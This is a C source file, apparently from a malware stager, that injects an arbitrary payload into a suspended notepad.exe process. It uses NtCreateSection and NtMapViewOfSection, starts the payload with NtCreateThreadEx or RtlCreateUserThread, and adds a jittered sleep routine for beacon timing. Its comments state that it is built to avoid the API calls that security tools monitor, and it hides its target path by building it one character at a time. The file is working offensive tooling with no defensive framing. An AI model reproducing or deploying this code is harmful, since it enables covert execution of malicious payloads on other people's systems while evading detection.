/*
 * Section Mapping Injection
 * Uses NtCreateSection + NtMapViewOfSection (local + remote)
 * Avoids VirtualAllocEx / WriteProcessMemory / CreateRemoteThread.
 */

#include "stager.h"

#ifndef NtCurrentProcess
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#endif

#ifndef ViewShare
#define ViewShare 1
#endif

static void *memcpx(void *dst, const void *src, SIZE_T n)
{
    BYTE *d = dst;
    const BYTE *s = src;
    while (n--) *d++ = *s++;
    return dst;
}

/* ============================================
 * Spawn sacrificial process in suspended state
 * ============================================ */
static BOOL SpawnSuspended(PAPI_TABLE Api, LPWSTR lpCmdLine, PHANDLE hProcess, PHANDLE hThread)
{
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!Api->CreateProcessW(NULL, lpCmdLine, NULL, NULL, FALSE,
                             CREATE_SUSPENDED | CREATE_NO_WINDOW,
                             NULL, NULL, &si, &pi)) {
        return FALSE;
    }

    *hProcess = pi.hProcess;
    *hThread  = pi.hThread;
    return TRUE;
}

/* ============================================
 * Inject payload via section mapping
 * ============================================ */
BOOL InjectSection(PAPI_TABLE Api, PBYTE pPayload, DWORD dwSize)
{
    HANDLE hProc = NULL, hThread = NULL, hSection = NULL;
    PVOID pLocal = NULL, pRemote = NULL;
    SIZE_T viewSize = 0;
    LARGE_INTEGER secSize = { 0 };
    WCHAR sacrificial[] = { 'C',':','\\','W','i','n','d','o','w','s','\\',
                            'S','y','s','t','e','m','3','2','\\',
                            'n','o','t','e','p','a','d','.','e','x','e',0 };

    /* 1. Spawn sacrificial process suspended */
    if (!SpawnSuspended(Api, sacrificial, &hProc, &hThread)) {
        return FALSE;
    }

    /* 2. Create executable section */
    secSize.QuadPart = dwSize;
    if (!NT_SUCCESS(Api->NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
                                          &secSize, PAGE_EXECUTE_READWRITE,
                                          SEC_COMMIT, NULL))) {
        Api->NtClose(hProc);
        Api->NtClose(hThread);
        return FALSE;
    }

    /* 3. Map into local process (RW) */
    viewSize = 0;
    if (!NT_SUCCESS(Api->NtMapViewOfSection(hSection, NtCurrentProcess(), &pLocal,
                                            0, 0, NULL, &viewSize, ViewShare,
                                            0, PAGE_READWRITE))) {
        Api->NtClose(hSection);
        Api->NtClose(hProc);
        Api->NtClose(hThread);
        return FALSE;
    }

    /* 4. Copy payload into local view */
    memcpx(pLocal, pPayload, dwSize);

    /* 5. Unmap from local process */
    Api->NtUnmapViewOfSection(NtCurrentProcess(), pLocal);

    /* 6. Map into remote process (RX) */
    pRemote = NULL;
    viewSize = 0;
    if (!NT_SUCCESS(Api->NtMapViewOfSection(hSection, hProc, &pRemote,
                                            0, 0, NULL, &viewSize, ViewShare,
                                            0, PAGE_EXECUTE_READ))) {
        Api->NtClose(hSection);
        Api->NtClose(hProc);
        Api->NtClose(hThread);
        return FALSE;
    }

    /* 7. Create remote thread at payload entry point */
    HANDLE hNewThread = NULL;
    if (!NT_SUCCESS(Api->NtCreateThreadEx(&hNewThread, THREAD_ALL_ACCESS, NULL,
                                          hProc, pRemote, NULL, FALSE, 0, 0, 0, NULL))) {
        /* Fallback to RtlCreateUserThread */
        CLIENT_ID cid = { 0 };
        Api->RtlCreateUserThread(hProc, NULL, FALSE, 0, NULL, NULL,
                                 pRemote, NULL, &hNewThread, &cid);
    }

    /* 8. Cleanup section handle, resume main thread, detach */
    Api->NtClose(hSection);
    Api->NtClose(hThread);   /* resume not needed — sacrificial stays suspended */
    Api->NtClose(hProc);

    return TRUE;
}

/* ============================================
 * Jittered sleep via NtDelayExecution
 * ============================================ */
VOID SleepJitter(PAPI_TABLE Api, DWORD dwMinMs, DWORD dwMaxMs)
{
    LARGE_INTEGER li;
    DWORD range = dwMaxMs - dwMinMs;
    DWORD jitter = 0;

    /* Simple LCG for jitter (no need for cryptorand here) */
    static DWORD seed = 0x12345678;
    seed = seed * 1103515245 + 12345;
    jitter = dwMinMs + (seed % (range + 1));

    li.QuadPart = -(10000LL * (LONGLONG)jitter);
    Api->NtDelayExecution(FALSE, &li);
}
